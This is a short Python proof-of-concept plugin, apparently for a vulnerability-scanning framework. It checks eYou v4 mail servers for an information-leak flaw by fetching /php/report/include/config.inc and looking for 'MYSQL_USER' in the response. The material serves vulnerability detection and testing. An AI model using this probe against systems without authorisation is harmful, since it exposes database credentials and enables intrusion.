# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'eYou_0016' # 平台漏洞编号，留空
    name = 'eYou v4 /php/report/include/config.inc 信息泄露' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-11-13'  # 漏洞公布时间
    desc = '''
        eYou v4 /php/report/include/config.inc 信息泄露漏洞
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0143760
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'eYou'  # 漏洞应用名称
    product_version = 'v4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'eyou_0016' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            code, head, res, errcode, _ = hh.http(url + '/php/report/include/config.inc')
            if code == 200 and 'MYSQL_USER' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()